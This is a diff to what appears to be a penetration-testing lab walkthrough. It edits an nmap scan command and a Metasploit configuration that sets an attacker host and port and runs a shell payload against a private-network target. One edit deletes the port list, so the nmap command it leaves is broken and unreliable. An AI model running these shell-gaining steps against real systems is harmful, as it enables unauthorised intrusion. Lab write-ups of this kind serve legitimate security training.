@@ -60,7 +60,7 @@ nmap -p- 192.168.1.20
 
 To perform an active scan with script execution:
 
-nmap -sV -sC -p <open_ports> 192.168.1.20
+nmap -sV -sC -p  192.168.1.20
 
 Unlike basic scanning, this command actively interacts with services to retrieve:
 Software versions
@@ -166,8 +166,8 @@ set payload cmd/unix/interact
 
 Configure target and local parameters:
 set RHOSTS 192.168.1.20
-set LHOST <your-attacker-ip>
-set LPORT <chosen-port>
+set LHOST 192.168.1.10
+set LPORT 6667
 run
 
 Result:
